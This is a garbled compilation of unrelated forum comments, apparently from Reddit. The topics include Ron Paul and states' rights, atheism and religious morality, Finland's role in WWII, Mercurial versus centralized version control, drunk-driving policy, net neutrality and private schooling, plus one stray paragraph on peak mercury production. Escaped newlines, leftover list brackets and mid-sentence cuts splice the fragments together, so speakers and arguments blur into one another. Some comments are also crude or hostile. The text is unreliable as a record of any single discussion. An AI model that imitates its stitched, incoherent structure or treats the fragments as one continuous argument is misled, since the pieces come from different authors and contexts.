locking people up for murder and robbery, *eventually* you\'ll find society locking them up for spitting on the sidewalk, or dropping single pieces of litter.\n\n\n\nObviously this kind of authoritarianism is *a possible* outcome from having laws, but we try to take care as a society to ensure that it doesn\'t become that extreme.  We accept that *some* infringement on people\'s freedoms is actually good for society, on balance.\n\n\n\nAnd ok, it doesn\'t always work perfectly smoothly (look at the present administration, for example), but that still doesn\'t mean it a valid argument to not lock people up for murder.\n\n\n\nFact is, the ""sweet spot"" on this issue *could* turn out to be somewhere in the middle - ensure parents are qualified and capable of giving the child a acceptable minimum quality of life and then leave the rest up to them.\n\n\n\nThe interesting thing is, society at present is *right at the other extreme*, and any suggestion that *any* change might get better results is acutely uncomfortable to talk about.  I find this interesting, as there doesn\'t seem yet to be a definite killer argument as to why not.', ""Fair play - it just seemed a pretty massive disruption, is all.

That\'s what I\'m driving at.  For the record, I used to support him until I went to a few meetings of his campaign. His demeanor struck me as too flakey for the presidency, though I agreed with many of policy positions, and aspects of his vision for America.\n\n\n\n\n\nIn the same vein, I was attracted to a lot of ideas put forward by RP, but other of his ideas and statements are downright repellent.  I don\'t think it\'s at all obvious that he\'s the best candidate, given his positions on Christian exceptionalism, extreme property libertarianism, weakness on civil rights and contempt for non-private solutions.

What the bill is trying to convey is a message that majority rules and while minorities can complain, they might not get their way. However, this is the nature of democracy and as such is acceptable from a pro-democracy standpoint.\n\n\n\n\n\nRight, just like the original states rights issue: slavery.  Too bad for minorities.

It's easy to say, for instance, that slavery would have worked itself out -- on who's timescale?  How many African generations do we expect should have been satisfied with that line, for instance?  Does their liberty matter less than states rights?\n\n\n\n\n\nWe accept, after all, the action of police to protect us from each other.  I presume RP does too?

However, religiosity to me seems to multiply our current problems.\n\n\n\n\n\nOn a more important note, from my perspective, America's obsession with property rights is at the very heart of the problem we're experiencing today.  Wealth is power.  And deep asymmetry in power means for all practical purposes that some will enjoy liberty while others will not.  Extreme property libertarianism does not account for this. "", 'Agreed.  Given the level of disagreement in the country, and even talk of secession, states rights and smaller federal government do make sense.  One can look at it as a modest kind of disunion - a loosening of the bonds that tie disagreeing parties together.\n\n\n\n\n\nThe progressive reaction (my reaction) to the right wing noises Paul makes (low taxes, states rights, religion) is due to the cynical way in which Republicans have exploited these issues (and others like patriotism, family, etc) to pursue a radical corporatist, authoritarian agenda.  So the whole heap of right wing ideas smells a little badly at this point.\n\n\n\n\n\nTaking Paul\'s policies in their totality, however, does indeed seem to point at a different vision: unyoking the states from each other, each to pursue its own ways.  A weaker Federal government, lower *Federal* taxes, lower military spending, abolishment of the CIA, lower federal social programs.  If his policy is to devolve these functions to the states (rather than religion), it would sound attractive to progressives, I think.  I\'m sure there are many blue staters who would be happy to let the red states go (and pay) their own way: in a sense to allow each state to compete in the market of opportunity.  Red staters can bloviate all they want about the coasts, but they\'ll be eating economic dust if that\'s what it comes down to.  I\'m sure progressives would be quite happy to place their bets on their home turf.   \n\n\n\n\n\nWhat I would like to know is -- what are RP\'s ideas about corporations?  Should they enjoy the kind of robust personhood they do today?  Should they shield their owners from liability?  What protections do the poor have from the wealthy?  The Government is at least, in theory ""ours""; whereas wealth and corporations are private (and increasingly owned by a smaller number of people).  Taking away Federal power without addressing this other issue seems a recipe for a new kind of disaster ([which seems already underway](http://www.amazon.com/Shock-Doctrine-Rise-Disaster-Capitalism/dp/0805079831 )).  Who will then be then be the gatekeepers - corporations, private security?  Not an attractive vision.

A religion adds explicit morals, while we have implicit morals built into us by evolution.\n\n\n\n&gt; it is not a case for theism by any stretch of the imagination.\n\n\n\nI wasn't necessarily arguing a case for religion, I'm an atheist myself. I just don't like seeing all the disparaging remarks about religious morality when they do offer something of value occasionally. \n\n\n\nFor example, the religious moral of not sleeping with another man's wife is not part of our innate sense of right and wrong. Yet this is something we might all agree is a valuable moral to have in our society. Thus its an explicit moral, given to us by the religion.\n\n\n\nI like this as a defense of atheism not having morality. You can explain implicit morality as something we all experience since birth, like hurting others that we visible see in pain and then contrast that with an explicit morality we learn that isn't obvious to us.

So we agree on these essentials and the only disagreement I am arguing is that we should legalize the really harmful drugs.\n\n\n\nFirst of all, my personal opinion is to legalize and free market the drug trade. I frankly don't care much about the lose of life or quality of life that addicts suffer. I have spent a lot of money and a lot of time educating myself to the effects of drugs and I know that I would protect the people closest to me from the negative effects in any way possible.

I wouldn't go out of my way to drive to a bad part of town to get it, but having to pick it up like  aspirin makes the task so much easier.\n\n\n\nSo, don't you agree that this form of making drugs illegal, makes it inaccessible to the causal user? Maybe the same argument could be said about assault guns or dynamite? \n\n\n\nI think you would have to suggest making them legal, but then putting such high distribution restrictions on them, it would have the same effect of being illegal anyway. Ask anyone if its illegal to have dynamite and they'll say it is, despite dynamite not being illegal.\n\n\n\nSo how can we make it legal and not restrict it to the same effect as being illegal?"", ""  Actually my comment was directed at disputing the previous comment that buddhism was better than atheism. I think it looked like I was countering the comment I directly replied to, but it was the previous commenter that I was indirectly replying to instead.\n\n\n\nHowever, I do find the points you've raied interesting enough to debate.\n\n\n\n&gt; in the case of Communist Russia and China, the problem with those regimes is that they were too much like a religion.\n\n\n\nI think it was Hitchens that said this first? I liked this as an explanation initially, but if you sit back and put some perspective on this claim, its not fair it what it does.\n\n\n\nIt essentially saying that the catholic doctrine was used and incorporated into the governmental systems of middle age European governments is bad, but that when atheistic doctrine was used and incorporated into governmental systems of russia, that it wasn't atheism fault and it was really religion in disguise.\n\n\n\nIt basically blames religion for entangling itself in government, but excuses atheism for entangling itself in the same fashion. I call foul on this concept.\n\n\n\nIf Stalin exploited the religious infrastructure to promote Stalin himself to the role of God, as Hitchens explains, then atheism can't argue its not a religion then. Its like saying, sorry we're not a religion and if we did anything bad, it was religions fault and not ours.\n\n\n\n&gt; Quit with the atheism is a way of life crap. It's simply an intellectual point of view. \n\n\n\nThis is really a separate argument in itself. I think this one is posed by Harris though.\n\n\n\nHe argues that atheism is a not believing in something and it would be like discussing the non-astrology position. He says that since there is no word for non-astrology believers, that there should be a word for the non-theist believers as well.\n\n\n\nI disagree with this though, in that the majority of atheists believe in a scientific approach to religion. Most atheists will argue that science has not proved God exists and that is why they don't believe in him. If science was to prove God existed, they would then cease to be atheists and then become theists.\n\n\n\nSo while you're correct that atheism is only an intellectual point of view, the majority of people claiming to be atheists are applying more than a viewpoint to the whole debate. They apply a critical thinking component, which  is not theist or atheist by   default. \n\n\n\nMy point being that they're only atheists for the moment and that could change any minute as new evidence arrives. When that evidence arrives (in theory) they will all shift and yet a few people will remain as atheists despite the evidence. These holdovers are the only neutral people that you refer to in being intellectual viewpoint holders. \n\n\n\n&gt; No atheist seeks to convert people will tales of terror or ultimatums.\n\n\n\nI disagree with this as well.

I\'m only partway through Dennitt\'s book and he argues more of a neutral position so far, but I suspect he\'ll get around to saying the direct negative effects of religion, which are given a negative light and made into something to be feared.\n\n\n\nSo I use this to refute the claim that atheists don\'t try to de-convert people with the use of fear. A real world fear as opposed to a fictional fear, but fear none-the-less.\n\n\n\n&gt; In the quiet words of the Virgin Mary, come again?\n\n\n\nhehehe, I never heard that before! I think the ""quiet"" isn\'t the best way to phrase it though, it seems to distract from the punchline a bit.\n\n\n\n&gt; Believing in atheism isn\'t going to make a person good, but if believing in christianity made people good, those untransformed by it are dismissed for not-being-real christians. \n\n\n\nI agree, I think this is the irrationality of theism. They dismiss the evil acts as not being part of their ""true"" religion. \n\n\n\nI think this is what I was countering you with, that atheists dismiss stalin as not being part of the ""true"" atheism.\n\n\n\nI think your thoughts on the subject are directly to the point. If you truly dismiss the christian link to the inquisition, then christians wouldn\'t be able to point to stalin either, since its the same comparison.\n\n\n\nHowever, if this is your stance, then you really can\'t claim anything evil being done by christianity, can you? Why would these cases you might give be any different than the inquisition?', 'what would be the difference of him suggesting a biplane design than?\n\n\n\nI was suggesting a spoiler from a car and considering the drawings lack of a lot of commonly accepted physics considerations, I suspect he very well may have been influenced by a cars spoiler!\n\n\n\nI\'m probably missing the years that spoilers were introduced into cars, but I think its odd that he would ""stabilize"" the end of the wing with more lift capacity.

What's even worse, is they don't even bother to force a sale anymore. It used to be that an officer of the court would administer the sale of the property, the taxes would go to the government, and the homeowner would get the difference. Now, they just sell the title to the property outright for the amount of the taxes and you get nothing.

While clearly, he believes climate change will be solved by government action, innovation, and free enterprise.  And he is doing what he can to get this process started and to keep it going.  Al Gore does not believe that we need to reduce the amount of power we consume, that we need to radically change our lifestyles, but that we need to reduce the amount of carbon emissions from the power we use, or when possible, use less.\n\n\n\nAl Gore is not a hypocrite.  He just has different ideas about how to solve these problems.  As far as his own personal responsibility for his carbon footprint goes, he believes he must take what reasonable measures he can to reduce it.

You can quibble with the decision, and debate where he draws the line, but Al Gore is not a fraud or a hypocrite because he is not advocating for anyone else what he himself is not doing.\n\n\n\nI think Al Gore is a good man because he handled defeat with dignity, because he appears to have principles that animate his thinking and public statements, because his judgment remained unbowed by the humiliation of the 2000 election loss, and because he was still willing to put himself out there and try to change the world for the better after this loss."", ""My sentence was poorly phrased - my excuse is that I'm typing quickly while at work.

The written article seems to accurately describe the situation and the associated map could certainly be better notated to differenciate between Finland and the Tripartite signees but this, to me, seems to be an issue of clarity rather than accuracy.', 'I totally disagree, it is not a clear inaccuracy.  Finland cooperated, coordinated, and participated in the invasion of Russia, one of the Allies.  So I find it at best debatable whether Finland can be referred to simply as part part of the ""Axis alliance"".  Regardless, the article explicitly states ""Finland fought with Germany against the Soviet Union but did not sign the Tripartite Pact and was not technically part of the Axis alliance.""  You can\'t get to the map without either reading or skipping that text. Lastly, the map is consistent in that it also identifies the other non-signatory German allies as Axis powers (see Hungary for example).  So obviously the intent of the map is to indicate all German allies, not signatory nations.  \n\n\n\n\n\nMy summary of the issue you raise is this: boo-hoo for Finland that a map now shows them as being part of the Axis alliance.

Well guess what, it doesn\'t work that way.  Finland chose to fight in cooperation with Nazi Germany during World War II.  They may have been somewhat or wholly justified in doing so, but either way they did it. It is a fact that you can\'t explain away by citing Finland\'s names for the war(s). It is a complex situation given the prior Russia vs. Finland conflict but that does nothing to change what happened.  Finland chose to follow ""The enemy of my enemy is my friend"" doctrine.  So did the US, why else were we allies with Russia?  But do we say the Russia wasn\'t really a member of the Allies, that we knew all along that there was a separate fight to be had with communism.  No, again it doesn\'t work that way.  I\'m sorry you\'re so upset about Finland and all but criticizing the Holocaust Museum under the guise of seemingly questioning their credibility isn\'t helping your cause any.

It's not a matter of whether it's right or wrong but whether that was the reason for the museum, even if it's not historically accurate."", 'I\'ve not at any point in this excused or dismissed the Finland/Russia conflict prior to WWII.  Why do you continue to pursue the line of logic?  I\'ve never said anything regarding Russia\'s actions.  This is all about Finlands actions.  I\'m not judging them at all.  I\'m just discussing the facts.  Did Finland cooperate and coordinate with Nazi Germany to further their existing fight against Russia?  Yes or no?  If yes, then the Fins prior conflict with Russia at that time became a part of WWII.  At that point it is no longer ""completely different"".  Why can\'t you understand that simple point?   ', ""Once they agreed to bring German troops into Finland to organize a coordinated attack then it ceased to be their own war against Russia.  From that point forward their war against Russia and Germany's war against Russia were intertwined.  How is it possible for them to be fighting a common enemy side by side and for that to be considered a different war?  Again, I'm not judging it but once they developed a cooperative relationship with Germany that involved sharing resources and troops they no longer pass a bright line test of having their conflict with Russia be separate from WWII.""]"

Ron Paul has taken 1st place in no fewer than 16 straw polls around the nation.\n\n\n\nAs another reporter, Denny Jackson, in the StatesmanJournal noted today:\n\n\n\n&gt; Oregon Republicans got a wake-up call when their straw poll at the Portland World Trade Center was transformed into a Ron Paul rally, and his supporters crushed the opposition in the poll.\n\n&gt; About 100 Paul supporters brought signs and banners, waved at traffic and pedestrians for blocks around the center, handed out literature and ended up putting Ron Paul in the winner\'s seat with 67 percent of the vote. Other candidates couldn\'t generate enough enthusiasm to get anyone at all to come out with any visible support.\n\n&gt; Instead of ignoring or opposing Paul\'s efforts as they have done to date, the Republican Party leadership should be asking themselves what it is about this man that brings so many people out of their comfortable homes and hobbies to volunteer to campaign for him when other politicians are looked upon as something nasty that got on their shoe.\n\n&gt; Here\'s a little hint for them: Ron Paul is today\'s Thomas Jefferson.\n\n\n\nBest Regards,\n\n\n\nDuane Johnson\n\nProvo, Utah']"

It would be tempting to attribute the decline in production of mercury to this factor. Mercury is a toxic metal which has been substituted with various other materials and devices and it is now slowly disappearing from the market. But most of the legislation forbidding the use of mercury came much later than the mercury peak (1962) and, as we saw, mercury peaked almost exactly at the “midpoint” of the available reserves, as predicted by the standard Hubbert model. A similar case, reduction in the demand, can be made for the peaking of lead, another poisonous metal. But for many applications, for instance car batteries, no substitute has been found so far for lead.

You can just copy the directory, but you're better off cloning it.  Each clone (checkout) is effectively a branch.\n\n\n\nBranches are good.  Distributed revision control systems got me using them.  Better things happened.\n\n\n\nMercurial and git both support in-tree branches, but neither requires you to branch that way.\n\n\n\nIt's really good for you not to think of pushing and pulling as ``copying over.''  Abstractly, you just move changesets around.  Although it's all in the same path, there's a good distinction between working directory and repository.  You can set your working directory to any version you want any time you want to.\n\n\n\nLikewise, a push or pull can very likely produce multiple heads.  Each head is a direction the code is growing from a particular changeset.  Any changeset you make can be a child of any other state your project has been in.\n\n\n\nA merge operation makes one head out of two.  This is where you end one of your growth directions and state that as of the change you're creating, both are now available.  A lot of times, this doesn't change the code at all, but marks the point where the two have come together.  Sometimes you have to smack it around some in order to make a proper working merge. "", "" It's really hard to agree with most of that.\n\n\n\nRegarding corporate use:\n\n\n\n&gt; Managers don’t want 20 different private forks of a codebase; they want one codebase that they can monitor all activity on.\n\n\n\nIf I have two branches, it means I can work on two different features on two different schedules independently.  When someone says, ``Hey!  Stop working on project X.  We need to ship project Y RSN!''  I can just jump over somewhere else without losing my place.\n\n\n\nThe reality I've experienced working with distributed revision control in such projects is that they're quite happy to see my flexibility.  Much more so than either of introduction of broken trees while in progress or long time delays with giant commits (more on this below).\n\n\n\nYou know what else they wanted, though?  The ability to ship a project off to an outsourcing facility, have them do work, and ship changes back in such a way that we could possibly integrate them back into our system.  That's an excellent default distributed systems give you.\n\n\n\n&gt; Cloning a repository is bad for corporate security. [...] No DVCS is able to provide fine-grained access control.\n\n\n\nIs it somehow worse to grab a tree with usable history than it is to grab the head-of-line code?  I don't buy that.\n\n\n\n&gt; Cloning is often unscalable for corporations. Many companies have huge codebases \n\n\n\nWould you say that there are actually multiple projects within these companies?  You either need it all, or you need parts.  If you need parts, you break stuff down into parts.  If you need it all, you will probably find that a mercurial clone and working directory is probably not bigger than a svn working directory.  It's certainly more useful, though.\n\n\n\nThis also relates to the security prod above.  If there's a sensitive part of a tree, it is a different project.  People already treat subversion trees as individual projects.  Just call it what it is and protect the parts that need protection.  Move on.\n\n\n\n&gt; with a centralized system, people are forced to collaborate and review each other’s work; in a decentralized system, the default behavior is for each developer to privately fork the project\n\n\n\nWith branches and easy ways to share things, it's easy to make changes and have the changes peer reviewed before making them generally available.\n\n\n\nIn my experience with centralized systems, people are just afraid to commit anything because of a fear that it's not quite ready, or it's broken and people shouldn't have to deal with it, etc...\n\n\n\nI've had two individuals who would try to get as much work done as possible before checking anything in.  No interim state.  No ability to even see if the project is moving in the right direction.  Lots of yelling.  This was all with centralized systems.\n\n\n\nOne of these guys was a contractor.  I desperately wanted to be able to just pull changesets from him without having to give him access to perforce.  I could've done something similar with a p4 branch in the first place, but we failed to think it through.  Pull and review (in a temporary location) is a perfectly reasonable practice in a distributed system.  You can't even do that in centralized systems without at least giving them write access *somewhere*.\n\n\n\n&gt; There is no magic bullet for version control.\n\n\n\nThe only place where mercurial (or pick your dvcs) isn't a superset of svn is in using it as a generic file backup mechanism where you have no project-oriented structure.  Most dvcs aren't good at that.  After having dealt with complicated CVS modules, perforce client specs, etc... I'm rather glad they require you to make a project tree a project tree. "", ' Well, two points:\n\n\n\n1) How easy is an after-the-fact branch in svn?\n\n\n\n2) The argument here seemed to be that branches are bad. ', ""Pushing and pulling doesn't copy the files, it copies the changesets.  The working directory is an entirely different matter, and is constructed from the changesets.\n\n\n\nCloning only copies the changesets that have been committed.  Copying does all of that plus your working directory (in whatever state it's in including local edits), tmp files, etc...\n\n\n\nYou can branch in tree.  Every time you commit against anything that's not tip you create a new head, thus a new branch.  You can even [name your branches](http://www.selenic.com/mercurial/wiki/index.cgi/NamedBranches) so you can easily find them again.\n\n\n\nA given project should have an obvious root.  For example, in a Django project called *foo*, you might have something like this:\n\n\n\n    .hg\n\n    foo       # the code\n\n    templates\n\n    media\n\n\n\nThat's typically what I do, although another project I'm working on put the templates within the code location.  Same concept.\n\n\n\nFrom there, I generally have a script that deploys the code by putting the various things in the various places.  That works out well because it also makes sure the same thing happens and keeps all of the parts of the tree on the same version."", "" That's not an after-the-fact branch.  That's a planned branch and a checkout.  How do the changes you've been working on get into that new tree you checked out?\n\n\n\nIn a distributed revision control system, you might have been committing changesets for a while, and then decide you don't want to push them so you just move the tree out of the way (or push them as a different branch or whatever).\n\n\n\nI don't get your argument about having a manager going around looking for people's work to be ready.  That doesn't scale anyway.  If your developers are not checking in code (centralized or not) when it's not ready, does your hypothetical manager go digging through all of their filesystems looking for uncommitted files?\n\n\n\nIt's the developers' responsibility to provide code when it's ready. "", '&gt; Giant “code bombs”, as Sussman calls them, are a failing of the developer(s), not the VCS.\n\n\n\nOn this point, we agree.\n\n\n\nIt is my experience that centralized revision control makes this phenomenon worse.  It is his hypothesis that distributed systems might encourage people to do it.', ""Mercurial can do the same quick diffing...but against any revision ever committed against the file up to the time you cloned it.  This obviously excludes any changes in other branches you haven't pulled, but you can pull those and they'll be there, too.\n\n\n\nIf the history is large enough, and enough files have moved around or been deleted or whatever, then mercurial's repo can get bigger, but it'd take a lot before it's *significantly* larger than svn (which doesn't include all the history).  I'd consider that good enough."", ""A shallow clone is mostly useless.  Specifically, you can't push from it as you would imply.\n\n\n\nAs masklinn points out, though... that's not the problem.  The problem is that you can't just dump all of your code into a versioning filesystem and then later decide what your projects are by pulling pieces out of this large mess.\n\n\n\nIt's really better that way.  :)"", ""&gt; What I'd like you to do is explain to me what my office of 5 people, all of whom work in the office, in 2 rooms right next to each other, would gain by switching to a DVCS (assuming tool support wasn't even a problem).\n\n\n\nAnother concrete example of this:\n\n\n\nI was in a group of five people, and two of us were working on a major refactoring.  With a distributed system, I could start moving some of the code, leaving it in a broken, but divided state, and commit that.  He could pick that up and we could each work on half of the broken, but divided state.\n\n\n\nWe were using perforce, though.  Our perforce administrator really doesn't like branches to be created except for official tasks *and* it's actually rather a hassle for me (and my coworker) to have the working directory be changed just because I'm doing some different work (welcome to java in eclipse with about ten subprojects).\n\n\n\nSo, instead of just committing some and starting to work, I kept working until I had enough done that I thought it could work on its own and committed all of it.  That basically meant that I did almost the entire task.\n\n\n\nI actually *did* share my mercurial clone of the tree to provide a patch to someone who wanted to try something really experimental one day, though.  On his side, that involved downloading the top patch and doing all kinds of p4 junk on is side, but for me, it was just an ``hg qrefresh ; hg serve''  :)"", ""&gt; Or you could send a patch to him to apply on a freshly checked out copy.\n\n\n\nMaking a freshly checked out copy isn't always as easy as it sounds.  It's a pain in perforce.  It's also a pain if you have a workflow that involves a specific directory (happens a lot in eclipse).  If you combine the two, it's just not workable.\n\n\n\nWith mercurial, I can typically dump my current work (using mq, or just commit it if it isn't offensive), jump to a different revision, apply a changeset from someone else and play with it some.  When I'm done, I can go back to where I was.""]"

And that rhetoric of name calling and ""you\'re stupid"" has been picked up by every AM radio host and right wing pundit since. Some of the most vile, disgusting, immature, insulting ad hominem ever spoking has come from the mouths of Bill O\'Reilly, Ann Coulter and their contemporaries. Hell, just look at the *title* of Coulter\'s newest book: ""If Democrats Had Any Brains, They\'d Be Republicans"" - or the titles of any of her previous ones. Or the titles of Sean Hannity\'s books: ""Deliver Us from Evil: Defeating Terrorism, Despotism, and Liberalism"" comes to mind. And that\'s just the titles, let alone the vitriol found inside these volumes, and let alone the stuff that spews from their mouths.\n\n\n\nFor years, the Democrats and left wing punditry *did* stay above it, and look what it got them. Finally we\'re starting to see some of the vitriol returned in kind (and then, mostly from the netroots rather than mainstream punditry).\n\n\n\n&gt; Since I don\'t think I\'m an idiot, and they seem to be acting like childish idiots, I don\'t really see what the Democratic side has to offer me.\n\n\n\nSo what, I would ask you, does the Republican side offer you? Why do Democrats turn you off for calling others idiots, but not Republicans?\n\n\n\nGranted, I\'d love if the political discourse in this country was civil, high minded, and rational - but it ain\'t. Let\'s face it - if there\'s one thing that Limbaugh proved in the last 20 years, it\'s that such childish name calling *works*. It\'s not the left to blame for that. And getting all high and mighty when bloggers and commenters join the right wing in the mud is a hell of a double standard.', ""&gt; Regardless of who started it, surely you can see that the venom coming from the left - particularly the bloggers - far out weighs the venom coming from the right.

O'Reilly is  the top rated talking head on cable news.\n\n\n\nFor people that aren't role models, they have a hell of a lot of people in their audience.\n\n\n\n&gt; Anyone else have an opinion on this?\n\n\n\nOn that latter point, I mostly agree... As I said, I'd much rather see high minded debate, and that's what I try to engage in myself.\n\n\n\nBut my point is that anyone who gives Limbaugh or Coulter an ear surrenders their moral authority to complain about name calling and venom that comes from the other side."", ""Well, I did say *further* left... everything's relative.

The point is to be able to talk about an idea concretely, and when doing so you have to try as hard as possible to remove whatever connotations you'd like to add to the word.\n\n\n\nSorry, we can't explain everything in colloquial terms so you'll have to use you're brain sometimes to grasp concepts that aren't immediately apparent.\n\n\n\nFurthermore, in this case the economic definition isn't the opposite of the colloquial definition, in fact the definitions are the same, but the scope of the actions are different. This means you can end up in cases where you end up calling the same action both rational and irrational, but as long as you know the context it should be  clear."", 'If you want a better grasp of formalism I would suggest reading Godel, Escher, Bach.\n\n\n\nLets try this, instead of using the word ""rational"" to describe this concept in economics (which I don\'t believe in by the way) lets use the word ""fruzzwumpal"". Now its possible to be fruzzwumpal and irrational at the same time right?\n\n\n\nThe reason economists use the word rational is because its a ""function"" that behaves similarly to our concept of rationality. The difference is that every day rationality has a range of personal consequence, and economic rationality has a range of social consequence. The domain for both of them is still personal actions. This is why you can use both ""functions"" on one ""graph"" and get a ""positive"" and ""negative"" result at the same time.\n\n\n\nAll that said I don\'t study economics or worry about it that much, I think for the most part its a pseudo-science that only recently has wizened up to using better math models.', 'actually I do. I think the reason people can\'t understand why this is happening is because they have taken our current system of law as the base for their model, rather than human nature.\n\n\n\nGood law codifies what humans already do. When it facilitates natural actions it is most successful. A good example is the Uniform Commerce Code.\n\nIn the case of Radiohead, they have finally hit upon a model where humans can do what is natural. It is my argument that the lopsided development of technology led to this artificial copyright quagmire where people are ""stealing"" music but not feeling bad about it.

Why am I learning C?  Why would anyone use C?\n\n\n\n1. To better understand how memory is used.  If you saw some of the code I see daily, it's clear that your average coder has no idea, for example, why in Java to use a StringBuffer instead of + for joining strings.\n\n\n\n2. Like it or not, it will be around forever.    A friend of mine writes video codecs, entirely in C, then optimizes in assembler.  For this task there's no better tool.  Also, the Linux kernel, and in fact a good part of all Linux programs are written in C.  And, as the poster points out, all language runtimes and OS'es are written in C or C++.\n\n\n\n3. Does memory footprint matter?  If virtualization is the future, then memory footprint matters more than ever.  A virtualized server won't have 2G of RAM (no Vista here!), but closer to 128/256M.\n\n\n\n4. OOP is not so special that it renders all other technologies obsolete (and this from a Java/.NET programmer!)  Good use of design patterns (Strategy, etc.) often involves replacing inheritance with composition.  In real-life OOP, it's rare to see useful inheritance more than two levels away from Object (outside of maybe UI toolkit code).  Anyway, inheritance can be simulated easily enough in C, for those moments when inheritance would be really helpful.\n\n\n\nThat's why I'm learning C.""]"

If China came to the U.S. tomorrow, and said ""here\'s your money back, we\'d like some gold/silver/whatever"" there\'s no way the U.S. could make that payment, it\'s just too big.  The failure to pay would destroy the US\'s credit rating, as people would assume that their dollars were worthless.  At this point, China hasn\'t sold their dollars (or was only able to sell a fraction of them before the economy crashed), and so the rest are worthless.  They have lost their investment.\n\n\n\nThis is why it is absolutely against China\'s interests to do this on a very basic level.  There are other reason\'s too (the ripple effect of a massive US crash would likely destroy other economies, even if they weren\'t holding dollars), but the fact that China *has* so many dollars means it would be suicide if they started selling them en masse.\n\n\n\nIf China thinks that the U.S. is a bad investment, they\'ll start holding something else, like the Euro.  But even if they do make a transition, they\'ll be very very careful how they do it, as they\'d still be in the hole if the dollar drops.   ']"

The supreme court agreed with me, but *somehow* found that they were ok because it was only a minor infringement (thanks, Rehnquist).  I\'ve also been in the car with a friend who had a beer, was stopped, harassed, arrested, and then passed the test with flying colors.\n\n\n\nThere are lots of more constitutional and intelligent ways of deterring people from driving drunk.  Here are some off the top of my head:\n\n\n\n1. Let people drink before they can drive (say, beer at 16 and driving at 18?)\n\n2. Encourage neighborhood bars and clubs in suburbia.  We\'re terrified of them: they\'ll bring drunk drivers!  lordy...\n\n3. Provide mass transit, and provide it at times when people may be drinking.  Instead we do the opposite (stopping long before closing time, if transit exists in any meaningful way in the first place).\n\n4. End closing times for bars and clubs.  Hey I know, let\'s kick all the drunk people out of bars at 2 am, putting them all on the road at the same time! Genius.\n\n5. If you do have closing times, mandate that clubs stay open for at least 2 hours after they stop serving alcohol.  Dance and burn off those vodka-bulls.\n\n6.

When you said net neutrality was about ""having internet access"" I kind of assumed you didn\'t know what you were talking about.\n\n\n\nThat being said, I don\'t think net neutrality is simply a bandage for barriers to competition. Even in a competitive free market, net neutrality would not flourish. It\'s more like artificially forcing the net to be a level playing field; in a free market most users would pay a little less for lower QoS, and some users would pay much more for higher QoS. Most people would be happy with slightly cheaper internet access, until somebody tries to start a web business. They\'ll realize that if they want to compete, they have to pay much more.\n\n\n\nIn that way, net neutrality is a bulwark against web monopolies. It also protects free speech. Without the ability to publish their own material, common users would lose ground to corporations in web content. Nonprofit websites wouldn\'t be able to raise the money for their increased fees. The web would become like television - a medium dominated by big businesses. Another aspect of net neutrality that is often overlooked is the prevention of ISPs from blocking certain sites and protocols. The importance of that is pretty obvious.\n\n\n\nAnd remember: it\'s the corporate lobbyists who are pushing against net neutrality. This isn\'t a bandage for that problem, but it would be a failure in that area to give in.   ']"

The boom in private schooling in urban areas, as parents become concerned by the declining quality of public education, seems to support my assertion that private schools are *often* attended by children whose parents don't want them in the same classroom with kids from the wrong side of the tracks.\n\n\n\n\n\nIt seems like people don't like hearing that, though."", ""Certainly. I live in the inner city and have had more than plenty exposure to the idiocy which is thug culture. However, the middle-class impulse to flee has created deep pockets of concentrated poverty that are, in many cases, self-perpetuating. What I would like to see is middle-class people with strong work ethics and good money-management skills actually *staying* in the neighborhoods - and schools - after they begin to change demographically, because when a poor family with lackluster economic and social skills lives next to two middle-class families, the poor family's kids are going to be much more likely to learn the types of behaviors that lead to economic well-being than if all three families on the block are poor. Get what I'm saying?\n\n\n\n\n\nI'm a liberal, by the way, but it's obvious that current spending on schools is ineffective. "", ""People have not yet attained enough wisdom to know that everyone's well-being is entwined with everyone else's. This lack of vision gives rise to shitty public institutions, such as schools, because people are not willing to commit fully to one another as a community. I apologize for couching it in harsh terms, but I do not back down. When we overcome inequality, social hyperstratification, and economic plundering, then these questions will all be moot.\n\n\n\n\n\nBut until then, listen to me once, and listen clearly: our society has not made a commitment to overcoming poverty. We simply *do not care*, because if we did we would achieve equality. It's that simple. Human beings are, for lack of a better way of putting it, pretty decent creators of destiny and the interpreters of reality. If we wanted poverty to leave forever, it would. We would turn our attention to it, and solutions would become apparent. I mean, we've transformed titanium hulls into airplanes. We've split the atom. One or two measly private schools instituted to give a chocolate corporation or a defunct and dessicated religion a good name *do not cut it*. \n\n\n\n\n\nShow me some real commitment to ending the ravages of poverty, ignorance and inequality that plague our cities, and I'll retract my statement. Until then, the facts stand. All the evidence says that we, as a society, choose to avoid the problem rather than deal with it. No matter how many orphans Hershey's uses for its PR department, the existence of private schools still means, in many cases, that someone is trying to avoid seeing their own dark side in a mirror."", ""You know, I actually live in Minneapolis, which is generally an attractive city. But I'm from a small town in Wisconsin, and people get ugly there real quick after high school."", 'Yeah, you\'ve got a point there. I know how nice it can be to live in a homogeneous community with a high-context social environment in which everyone pretty much understands everyone else. However, I think there are certain other impulses within the human psyche that are perhaps deeper and more hidden than the tribalistic ones and that urge us to make contact with the ""other"" and to experience the world through others\' eyes. This experience is preferable to remaining isolated in tribal groups, because it provides perspective which then can be used for positive gain. However, you\'re right in pointing out that humans are generally extraordinarily resistant to these cross-tribal exchanges. What I\'m saying is that, as educated, materially priveleged members of the American middle class, we should actually be expected to overcome those tribal instincts and initiate contact, especially with other cultures that might be less advantaged, because the gains could be significant for both. For example, rock and roll came from the intersection of European and African musical styles. Think of what ideas or cultural innovations might come from real exchange in current circumstances.']"

As a counterexample, God changing his mind could be conceived as the ""perfect"" course of action to take.\n\n\n\n&gt; There are plenty of contradictions within the New Testament\n\n\n\nNo, there isn\'t.\n\n\n\n&gt; If God changes his mind again, will he write a new book to let us know?\n\n\n\nWhat do you think Islam and Mormonism are?', 'Well, then I take responsibility for the Eastern Orthodox Church in Northwest Indiana. The rest of you Christians get to work!', 'thanks', 'FUCK YOU LETS SEE YOU TRY AND STOP ME', '  &gt; If God is perfect, omnipotent, omnipresent, and omniscient, then he would have no need to change the laws (send Jesus) half way through Human history.\n\n\n\nBullshit. There\'s always the possibility that sending Jesus at that time to change rules for those who follow him was the optimal thing to do. Imagine a game that changes rules after certain criteria are met. How can you even say that\'s not perfect?\n\n\n\nYou can\'t even begin to quantify ""perfect"" in this sense, anyway. What does ""perfect"" even mean to you? Maybe changing rules is a better idea than outlining them all at the beginning. Maybe God\'s goal isn\'t even to provide accurate rules; maybe this is done on purpose and is, unbeknownst to us, a more perfect course of action.\n\n\n\nYou\'re committing the logical fallacy of a failure of imagination: just because God doesn\'t meet *your* criteria for perfection doesn\'t mean he\'s not; you\'ve failed to conceive of other ideas of perfection.\n\n\n\n&gt; Yes there are.\n\n\n\nThose are garbage. Most of those are slight differences in wording, inconsequential to actual moral guidelines, or like #37, are completely taken out of context 